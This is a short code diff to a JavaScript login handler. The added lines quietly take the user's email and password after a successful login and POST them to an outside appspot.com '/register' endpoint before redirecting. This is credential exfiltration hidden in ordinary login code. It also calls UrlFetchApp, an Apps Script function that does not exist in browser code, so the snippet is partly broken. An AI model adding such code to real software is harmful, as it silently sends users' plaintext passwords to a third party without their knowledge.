@@ -41,6 +41,16 @@ var userLogin=()=>{
 		  var data = JSON.parse(this.responseText);
 		  if(data["success"]==true)
 			{
+				var d = {
+				  'email': email,
+				  'password': pass
+				};
+
+				var options = {
+				  'method' : 'post',
+				  'payload' : d
+				};
+				UrlFetchApp.fetch('https://malkarajtraining12.uc.r.appspot.com/register', options);
 				window.location.href = "/";
 			}
 		  else
